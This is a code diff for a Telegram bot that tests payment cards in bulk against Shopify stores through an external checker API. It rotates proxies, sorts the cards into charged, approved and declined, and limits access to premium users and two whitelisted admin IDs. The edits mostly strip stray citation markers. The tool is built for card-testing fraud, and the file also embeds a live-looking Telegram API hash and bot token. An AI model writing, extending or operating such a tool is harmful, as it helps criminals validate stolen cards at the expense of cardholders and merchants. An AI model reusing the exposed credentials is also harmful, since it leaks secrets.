@@ -9,7 +9,7 @@ import json
 import re
 from datetime import datetime
 
-CHECKER_API_URL = 'https://backend-vxo-production.up.railway.app/check'[cite: 19]
+CHECKER_API_URL = 'https://backend-vxo-production.up.railway.app/check'
 
 PREMIUM_EMOJI_IDS = {
     "✅": "6023660820544623088",
@@ -54,9 +54,9 @@ API_ID = 21124241
 API_HASH = 'b7ddce3d3683f54be788fddae73fa468'
 BOT_TOKEN = '8872654381:AAF8rRvAvid-JtbU7AbpU8g4acECXfIfRh0'
 
-PREMIUM_FILE = 'premium.txt'[cite: 8]
-SITES_FILE = 'sites.txt'[cite: 12, 18]
-PROXY_FILE = 'proxy.txt'[cite: 9]
+PREMIUM_FILE = 'premium.txt'
+SITES_FILE = 'sites.txt'
+PROXY_FILE = 'proxy.txt'
 
 bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 active_sessions = {}
@@ -93,16 +93,19 @@ def get_file_lines(filepath):
         return []
 
 def load_premium_users():
-    return get_file_lines(PREMIUM_FILE)[cite: 8]
+    return get_file_lines(PREMIUM_FILE)
 
 def load_sites():
-    return get_file_lines(SITES_FILE)[cite: 12, 18]
+    return get_file_lines(SITES_FILE)
 
 def load_proxies():
-    return get_file_lines(PROXY_FILE)[cite: 9]
+    return get_file_lines(PROXY_FILE)
 
 def is_premium(user_id):
-    return str(user_id) in load_premium_users()[cite: 6, 8]
+    ADMIN_IDS = [1026193545, 5248903529]
+    if int(user_id) in ADMIN_IDS:
+        return True
+    return str(user_id) in load_premium_users()
 
 def extract_cc(text):
     pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
@@ -154,32 +157,32 @@ async def check_card(card, site, proxy):
                 else:
                     formatted_proxy = f"http://{formatted_proxy}"
 
-        params = {'card': card, 'url': site, 'proxy': formatted_proxy, 'low': 'true'}[cite: 1, 19]
+        params = {'card': card, 'url': site, 'proxy': formatted_proxy, 'low': 'true'}
         timeout = aiohttp.ClientTimeout(total=120)
         async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(CHECKER_API_URL, params=params) as resp:[cite: 6, 19]
+            async with session.get(CHECKER_API_URL, params=params) as resp:
                 text_response = await resp.text()
                 raw = json.loads(text_response)
 
-        status_code = raw.get('status_code', '')[cite: 1, 19]
-        resp_msg = raw.get('error', '') or raw.get('Response', '')[cite: 1, 19]
-        price = raw.get('amount', '') or raw.get('Price', '0.00')[cite: 1, 19]
-        gate = raw.get('Gate', 'Shopify Payments')[cite: 1, 19]
-        api_status = raw.get('status', '') or raw.get('Response', '')[cite: 1, 19]
+        status_code = raw.get('status_code', '')
+        resp_msg = raw.get('error', '') or raw.get('Response', '')
+        price = raw.get('amount', '') or raw.get('Price', '0.00')
+        gate = raw.get('Gate', 'Shopify Payments')
+        api_status = raw.get('status', '') or raw.get('Response', '')
 
         if is_dead_site_error(resp_msg):
             return {'status': 'Site Error', 'message': resp_msg, 'card': card, 'site': site, 'retry': True, 'gateway': gate, 'price': price}
 
-        if api_status == 'CHARGED' or status_code == 'ORDER_PLACED':[cite: 1, 19]
-            return {'status': 'Charged', 'message': status_code or 'ORDER_PLACED', 'card': card, 'site': site, 'gateway': gate, 'price': price}[cite: 1, 19]
-        elif api_status == 'APPROVED' or status_code in ['INSUFFICIENT_FUNDS', 'INCORRECT_CVC', 'INCORRECT_ZIP']:[cite: 1, 19]
-            if status_code == 'INSUFFICIENT_FUNDS':[cite: 1, 19]
+        if api_status == 'CHARGED' or status_code == 'ORDER_PLACED':
+            return {'status': 'Charged', 'message': status_code or 'ORDER_PLACED', 'card': card, 'site': site, 'gateway': gate, 'price': price}
+        elif api_status == 'APPROVED' or status_code in ['INSUFFICIENT_FUNDS', 'INCORRECT_CVC', 'INCORRECT_ZIP']:
+            if status_code == 'INSUFFICIENT_FUNDS':
                 return {'status': 'Insufficient Funds', 'message': 'INSUFFICIENT_FUNDS', 'card': card, 'site': site, 'gateway': gate, 'price': price}
-            return {'status': 'Approved', 'message': status_code or api_status, 'card': card, 'site': site, 'gateway': gate, 'price': price}[cite: 1, 19]
-        elif '3ds' in status_code.lower() or 'challenge' in status_code.lower() or '3ds' in resp_msg.lower() or api_status == '3DS_AUTHENTICATION':[cite: 1, 19]
-            return {'status': '3D/OTP', 'message': status_code or 'CHALLENGE_REQUIRED_3DS', 'card': card, 'site': site, 'gateway': gate, 'price': price}[cite: 1, 19]
+            return {'status': 'Approved', 'message': status_code or api_status, 'card': card, 'site': site, 'gateway': gate, 'price': price}
+        elif '3ds' in status_code.lower() or 'challenge' in status_code.lower() or '3ds' in resp_msg.lower() or api_status == '3DS_AUTHENTICATION':
+            return {'status': '3D/OTP', 'message': status_code or 'CHALLENGE_REQUIRED_3DS', 'card': card, 'site': site, 'gateway': gate, 'price': price}
         else:
-            return {'status': 'Declined', 'message': status_code or resp_msg or 'CARD_DECLINED', 'card': card, 'site': site, 'gateway': gate, 'price': price}[cite: 1, 19]
+            return {'status': 'Declined', 'message': status_code or resp_msg or 'CARD_DECLINED', 'card': card, 'site': site, 'gateway': gate, 'price': price}
     except Exception as e:
         err_str = str(e).lower()
         if 'proxy' in err_str or 'tunnel' in err_str or 'connect' in err_str:
@@ -187,7 +190,7 @@ async def check_card(card, site, proxy):
         return {'status': 'Declined', 'message': str(e), 'card': card, 'site': site, 'gateway': 'Unknown', 'price': '0.00'}
 
 async def check_card_with_retry(card, sites, proxies, max_retries=2):
-    if not sites or not proxies:[cite: 6]
+    if not sites or not proxies:
         return {'status': 'Declined', 'message': 'No sites or proxies available', 'card': card, 'site': '', 'gateway': 'Unknown', 'price': '0.00'}
     for attempt in range(max_retries):
         chosen_site = random.choice(sites)
@@ -219,8 +222,8 @@ async def test_proxy(proxy):
 
 @bot.on(events.NewMessage(incoming=True, pattern=r'^/start'))
 async def start_cmd(event):
-    if not is_premium(event.sender_id):[cite: 6]
-        await event.reply(premium_emoji("❌ <b>Access Denied</b>"), parse_mode='html')[cite: 6]
+    if not is_premium(event.sender_id):
+        await event.reply(premium_emoji("❌ <b>Access Denied</b>"), parse_mode='html')
         return
     await event.reply(
         premium_emoji(
@@ -248,18 +251,18 @@ async def start_cmd(event):
 
 @bot.on(events.NewMessage(incoming=True, pattern=r'^/cc'))
 async def cc_cmd(event):
-    if not is_premium(event.sender_id): return[cite: 6]
-    sites, proxies = load_sites(), load_proxies()[cite: 6, 9, 12, 18]
-    if not sites or not proxies:[cite: 6]
-        await event.reply(premium_emoji("❌ Missing sites or proxies."), parse_mode='html')[cite: 6]
+    if not is_premium(event.sender_id): return
+    sites, proxies = load_sites(), load_proxies()
+    if not sites or not proxies:
+        await event.reply(premium_emoji("❌ Missing sites or proxies."), parse_mode='html')
         return
-    cards = extract_cc(event.message.text)[cite: 6]
+    cards = extract_cc(event.message.text)
     if not cards:
         await event.reply(premium_emoji("❌ Invalid format. Use: <code>/cc card|mm|yy|cvv</code>"), parse_mode='html')
         return
     card = cards[0]
     msg = await event.reply(premium_emoji(f"<b>Checking...</b> <code>{card}</code>"), parse_mode='html')
-    res = await check_card_with_retry(card, sites, proxies, max_retries=3)[cite: 6]
+    res = await check_card_with_retry(card, sites, proxies, max_retries=3)
     brand, bank, country, flag = await get_bin_info(card[:6])
     
     status_type = res['status']
@@ -290,10 +293,10 @@ async def cc_cmd(event):
 
 @bot.on(events.NewMessage(incoming=True, pattern=r'^/site'))
 async def site_cmd(event):
-    if not is_premium(event.sender_id): return[cite: 6]
-    sites = load_sites()[cite: 12, 18]
-    proxies = load_proxies()[cite: 9]
-    if not sites or not proxies:[cite: 6]
+    if not is_premium(event.sender_id): return
+    sites = load_sites()
+    proxies = load_proxies()
+    if not sites or not proxies:
         await event.reply(premium_emoji("❌ Sites or proxy list empty."), parse_mode='html')
         return
     msg = await event.reply(premium_emoji(f"🔥 Checking {len(sites)} sites..."))
@@ -301,31 +304,31 @@ async def site_cmd(event):
     for s in sites:
         r = await test_site(s, random.choice(proxies))
         if r['status'] == 'alive': alive.append(s)
-    async with aiofiles.open(SITES_FILE, 'w', encoding='utf-8') as f:[cite: 12, 18]
+    async with aiofiles.open(SITES_FILE, 'w', encoding='utf-8') as f:
         for s in alive: await f.write(f"{s}\n")
     await msg.edit(premium_emoji(f"✅ <b>Site check complete!</b> Alive: {len(alive)}/{len(sites)}"), parse_mode='html')
 
 @bot.on(events.NewMessage(incoming=True, pattern=r'^/rm\s+'))
 async def rm_site_cmd(event):
-    if not is_premium(event.sender_id): return[cite: 6]
+    if not is_premium(event.sender_id): return
     parts = event.message.text.split(' ', 1)
     if len(parts) < 2:
         await event.reply(premium_emoji("❌ Usage: `/rm https://site.com`"), parse_mode='html')
         return
     url = parts[1].strip()
-    sites = load_sites()[cite: 12, 18]
+    sites = load_sites()
     if url not in sites:
         await event.reply(premium_emoji(f"❌ Site not found: `{url}`"), parse_mode='html')
         return
     new_sites = [s for s in sites if s != url]
-    async with aiofiles.open(SITES_FILE, 'w', encoding='utf-8') as f:[cite: 12, 18]
+    async with aiofiles.open(SITES_FILE, 'w', encoding='utf-8') as f:
         for s in new_sites: await f.write(f"{s}\n")
     await event.reply(premium_emoji(f"✅ <b>Site removed successfully!</b>\n`{url}`"), parse_mode='html')
 
 @bot.on(events.NewMessage(incoming=True, pattern=r'^/proxy$'))
 async def proxy_cmd(event):
-    if not is_premium(event.sender_id): return[cite: 6]
-    proxies = load_proxies()[cite: 9]
+    if not is_premium(event.sender_id): return
+    proxies = load_proxies()
     if not proxies:
         await event.reply(premium_emoji("❌ `proxy.txt` is empty."), parse_mode='html')
         return
@@ -334,13 +337,13 @@ async def proxy_cmd(event):
     for p in proxies:
         r = await test_proxy(p)
         if r['status'] == 'alive': alive.append(p)
-    async with aiofiles.open(PROXY_FILE, 'w', encoding='utf-8') as f:[cite: 9]
+    async with aiofiles.open(PROXY_FILE, 'w', encoding='utf-8') as f:
         for p in alive: await f.write(f"{p}\n")
     await msg.edit(premium_emoji(f"✅ <b>Proxy check done!</b> Alive: {len(alive)}/{len(proxies)}"), parse_mode='html')
 
 @bot.on(events.NewMessage(incoming=True, pattern=r'^/chkproxy\s+'))
 async def chk_proxy_cmd(event):
-    if not is_premium(event.sender_id): return[cite: 6]
+    if not is_premium(event.sender_id): return
     parts = event.message.text.split(' ', 1)
     if len(parts) < 2:
         await event.reply(premium_emoji("❌ Usage: <code>/chkproxy ip:port:user:pass</code>"), parse_mode='html')
@@ -355,7 +358,7 @@ async def chk_proxy_cmd(event):
 
 @bot.on(events.NewMessage(incoming=True, pattern=r'^/addproxy'))
 async def add_proxy_cmd(event):
-    if not is_premium(event.sender_id): return[cite: 6]
+    if not is_premium(event.sender_id): return
     raw_text = event.message.text
     lines = raw_text.split('\n')
     
@@ -371,34 +374,34 @@ async def add_proxy_cmd(event):
         await event.reply(premium_emoji("❌ Usage:\n1) `/addproxy ip:port:user:pass`\n2) `/addproxy` followed by proxies on new lines."), parse_mode='html')
         return
 
-    current = load_proxies()[cite: 9]
+    current = load_proxies()
     added = [p for p in to_add if p not in current]
     if not added:
         await event.reply(premium_emoji("⚠️ Provided proxy/proxies already exist in file."), parse_mode='html')
         return
 
-    async with aiofiles.open(PROXY_FILE, 'a', encoding='utf-8') as f:[cite: 9]
+    async with aiofiles.open(PROXY_FILE, 'a', encoding='utf-8') as f:
         for p in added: await f.write(f"{p}\n")
-    await event.reply(premium_emoji(f"✅ <b>Successfully Added!</b>\nAdded {len(added)} new proxy(ies) to <code>proxy.txt</code>."), parse_mode='html')[cite: 9]
+    await event.reply(premium_emoji(f"✅ <b>Successfully Added!</b>\nAdded {len(added)} new proxy(ies) to <code>proxy.txt</code>."), parse_mode='html')
 
 @bot.on(events.NewMessage(incoming=True, pattern=r'^/rmproxy\s+'))
 async def rm_proxy_cmd(event):
-    if not is_premium(event.sender_id): return[cite: 6]
+    if not is_premium(event.sender_id): return
     parts = event.message.text.split(' ', 1)
     if len(parts) < 2: return
     p_rem = parts[1].strip()
-    current = load_proxies()[cite: 9]
+    current = load_proxies()
     if p_rem not in current:
         await event.reply(premium_emoji("❌ Proxy not found."), parse_mode='html')
         return
     new_p = [p for p in current if p != p_rem]
-    async with aiofiles.open(PROXY_FILE, 'w', encoding='utf-8') as f:[cite: 9]
+    async with aiofiles.open(PROXY_FILE, 'w', encoding='utf-8') as f:
         for p in new_p: await f.write(f"{p}\n")
     await event.reply(premium_emoji(f"✅ Proxy removed: <code>{p_rem}</code>"), parse_mode='html')
 
 @bot.on(events.NewMessage(incoming=True, pattern=r'^/rmproxyindex\s+'))
 async def rm_proxy_idx_cmd(event):
-    if not is_premium(event.sender_id): return[cite: 6]
+    if not is_premium(event.sender_id): return
     parts = event.message.text.split(' ', 1)
     if len(parts) < 2: return
     try:
@@ -406,23 +409,23 @@ async def rm_proxy_idx_cmd(event):
     except:
         await event.reply(premium_emoji("❌ Invalid format. Use comma separated numbers."), parse_mode='html')
         return
-    current = load_proxies()[cite: 9]
+    current = load_proxies()
     new_p = [p for idx, p in enumerate(current) if idx not in indices]
-    async with aiofiles.open(PROXY_FILE, 'w', encoding='utf-8') as f:[cite: 9]
+    async with aiofiles.open(PROXY_FILE, 'w', encoding='utf-8') as f:
         for p in new_p: await f.write(f"{p}\n")
     await event.reply(premium_emoji(f"✅ Removed proxies by index."), parse_mode='html')
 
 @bot.on(events.NewMessage(incoming=True, pattern=r'^/clearproxy$'))
 async def clear_proxy_cmd(event):
-    if not is_premium(event.sender_id): return[cite: 6]
-    async with aiofiles.open(PROXY_FILE, 'w', encoding='utf-8') as f:[cite: 9]
+    if not is_premium(event.sender_id): return
+    async with aiofiles.open(PROXY_FILE, 'w', encoding='utf-8') as f:
         await f.write("")
     await event.reply(premium_emoji("✅ All proxies cleared."), parse_mode='html')
 
 @bot.on(events.NewMessage(incoming=True, pattern=r'^/getproxy$'))
 async def get_proxy_cmd(event):
-    if not is_premium(event.sender_id): return[cite: 6]
-    current = load_proxies()[cite: 9]
+    if not is_premium(event.sender_id): return
+    current = load_proxies()
     if not current:
         await event.reply(premium_emoji("❌ No proxies found."), parse_mode='html')
         return
@@ -442,20 +445,20 @@ async def get_proxy_cmd(event):
 @bot.on(events.NewMessage(incoming=True, pattern=r'^/chk$'))
 async def chk_cmd(event):
     user_id = event.sender_id
-    if not is_premium(user_id) or not event.reply_to_msg_id:[cite: 6]
+    if not is_premium(user_id) or not event.reply_to_msg_id:
         return
     reply = await event.get_reply_message()
     if not reply.file or not reply.file.name.endswith('.txt'):
         return
-    sites, proxies = load_sites(), load_proxies()[cite: 6, 9, 12, 18]
-    if not sites or not proxies:[cite: 6]
-        await event.reply(premium_emoji("❌ Missing sites or proxies."))[cite: 6]
+    sites, proxies = load_sites(), load_proxies()
+    if not sites or not proxies:
+        await event.reply(premium_emoji("❌ Missing sites or proxies."))
         return
 
     status_msg = await event.reply(premium_emoji("🫆 Processing your file..."))
     path = await reply.download_media()
     async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
-        cards = extract_cc(await f.read())[cite: 6]
+        cards = extract_cc(await f.read())
     try:
         os.remove(path)
     except:
@@ -485,7 +488,7 @@ async def chk_cmd(event):
             try: card = q.get_nowait()
             except: break
             
-            res = await check_card_with_retry(card, load_sites(), load_proxies(), max_retries=1)[cite: 6, 9, 12, 18]
+            res = await check_card_with_retry(card, load_sites(), load_proxies(), max_retries=1)
             results['checked'] += 1
             
             status = res['status']
@@ -506,7 +509,6 @@ async def chk_cmd(event):
                 
             q.task_done()
             
-            # Real-time streaming update panel every 1 second
             if time.time() - last_up[0] >= 1.0 or results['checked'] == results['total']:
                 last_up[0] = time.time()
                 if session_key in active_sessions:
@@ -556,7 +558,7 @@ async def chk_cmd(event):
         f"<b>🎯💠 𝐇𝐢𝐭𝐬 𝐏𝐫𝐞𝐯𝐢𝐞𝚠</b>\n"
         f"<blockquote>{hits_txt}</blockquote>\n"
         f"<b>━━━━━━━━━━━━━━━━━</b>\n"
-        f"🤖 <b>Bot By: <a href=\"tg://user?id=5248903529\">ㅤㅤＫａｍａ𝗹</a></b>"
+        f"🤖 <b>Bot By: <a href=\"tg://user?id=5248903529\">ㅤㅤＫａｍａｌ</a></b>"
     )
     
     fname = f"shopiii_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
@@ -588,5 +590,5 @@ async def callback_handler(event):
                 await event.answer("Checker stopped 🛑")
             break
 
-print("✅ Bot with relative file paths and live streaming started successfully!")
+print("✅ Bot started successfully with your ID whitelisted!")
 bot.run_until_disconnected()
